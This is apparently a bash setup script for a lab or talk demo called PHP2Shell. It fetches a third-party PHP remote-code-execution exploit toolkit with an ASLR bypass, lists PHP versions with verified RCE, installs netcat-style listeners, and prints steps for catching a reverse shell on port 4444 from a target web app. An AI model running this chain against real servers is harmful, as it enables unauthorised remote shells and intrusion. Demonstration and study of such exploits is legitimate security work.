#!/usr/bin/env bash
#
# PHP2Shell — Kali preparation (once, before the talk).
#
#   ./setup-kali.sh                       # clone the toolkit into ~/tools/php2shell
#   ./setup-kali.sh --dir ~/p2s           # another destination
#   ./setup-kali.sh --from /mnt/usb/php2shell   # use a local copy (offline)
#
# The toolkit is third-party work and is not bundled in this repository. This
# script only automates what its own documentation asks for: clone it, bootstrap
# the pinned upstream (9bie, commit 4586f5c) and list the profiles with a
# verified RCE.
#
# Credits: the exploit chain belongs to devploit (php2shell) and 9bie
# (php2shell-bypass-aslr-exp upstream), not to this lab. The lab, the app, the
# stager and these scripts are written by r19.

set -euo pipefail

DEST="${HOME}/tools/php2shell"
REPO="${P2S_TOOLKIT_REPO:-https://github.com/devploit/php2shell}"
FROM=""

while [[ $# -gt 0 ]]; do
    case "$1" in
        --dir)  DEST="${2:-}"; shift 2 ;;
        --from) FROM="${2:-}"; shift 2 ;;
        --repo) REPO="${2:-}"; shift 2 ;;
        -h|--help) sed -n '2,15p' "$0"; exit 0 ;;
        *) echo "unknown argument: $1" >&2; exit 2 ;;
    esac
done

say() { printf '\n[*] %s\n' "$1"; }
ok()  { printf '    ok  %s\n' "$1"; }
die() { printf '\n[!] %s\n' "$1" >&2; exit 1; }

command -v python3 >/dev/null || die "python3 missing (apt install python3)"
command -v git >/dev/null || die "git missing (apt install git)"

python3 - <<'PY' || die "the toolkit needs Python 3.11 or newer"
import sys
print(f"    python3: {sys.version.split()[0]}")
sys.exit(0 if sys.version_info >= (3, 11) else 1)
PY

say "fetching the toolkit"
if [[ -n "$FROM" ]]; then
    [[ -d "$FROM" ]] || die "local copy not found: $FROM"
    mkdir -p "$(dirname "$DEST")"
    rm -rf "$DEST"
    cp -R "$FROM" "$DEST"
    ok "copied from $FROM"
elif [[ -d "$DEST/.git" ]]; then
    git -C "$DEST" pull --ff-only
    ok "updated in $DEST"
else
    mkdir -p "$(dirname "$DEST")"
    git clone --depth 1 "$REPO" "$DEST" || die "cannot clone $REPO (use --from <dir> with a local copy)"
    ok "cloned into $DEST"
fi

[[ -f "$DEST/tools/php2shell_auto.py" ]] || die "unexpected layout: tools/php2shell_auto.py missing in $DEST"

say "bootstrapping the pinned upstream (9bie/php2shell-bypass-aslr-exp, commit 4586f5c)"
( cd "$DEST" && python3 tools/bootstrap_upstream.py ) || die "bootstrap failed (offline? use --from)"

say "profiles with a verified RCE"
if python3 "$DEST/tools/php2shell_auto.py" --list >/tmp/p2s-profiles.txt 2>/dev/null; then
    grep -E '8\.5\.1[01]|8\.4\.2[56]' /tmp/p2s-profiles.txt | head -n 20 || sed -n '1,20p' /tmp/p2s-profiles.txt
    ok "list saved to /tmp/p2s-profiles.txt"
else
    printf '    (this toolkit version has no --list; run --help)\n'
fi

say "listener tools (ncat/rlwrap)"
for pkg in ncat rlwrap; do
    if dpkg -s "$pkg" >/dev/null 2>&1; then
        ok "$pkg present"
    else
        sudo apt-get install -y "$pkg" >/dev/null 2>&1 && ok "$pkg installed" || printf '    warning: could not install %s\n' "$pkg"
    fi
done

IP="$(hostname -I 2>/dev/null | awk '{print $1}')"

cat <<EOF

────────────────────────────────────────────────────────────────────
Ready.

  toolkit : $DEST
  command : python3 $DEST/tools/php2shell_auto.py
  your IP : ${IP:-<find it with: hostname -I>}

Demo sequence (two panes):

  ./p2s-listen.sh --lport 4444                                  # pane 1
  ./p2s-run.sh --target http://<ubuntu-IP>:8080 --step proof     # pane 2
  ./p2s-run.sh --target http://<ubuntu-IP>:8080 --step shell
────────────────────────────────────────────────────────────────────
EOF
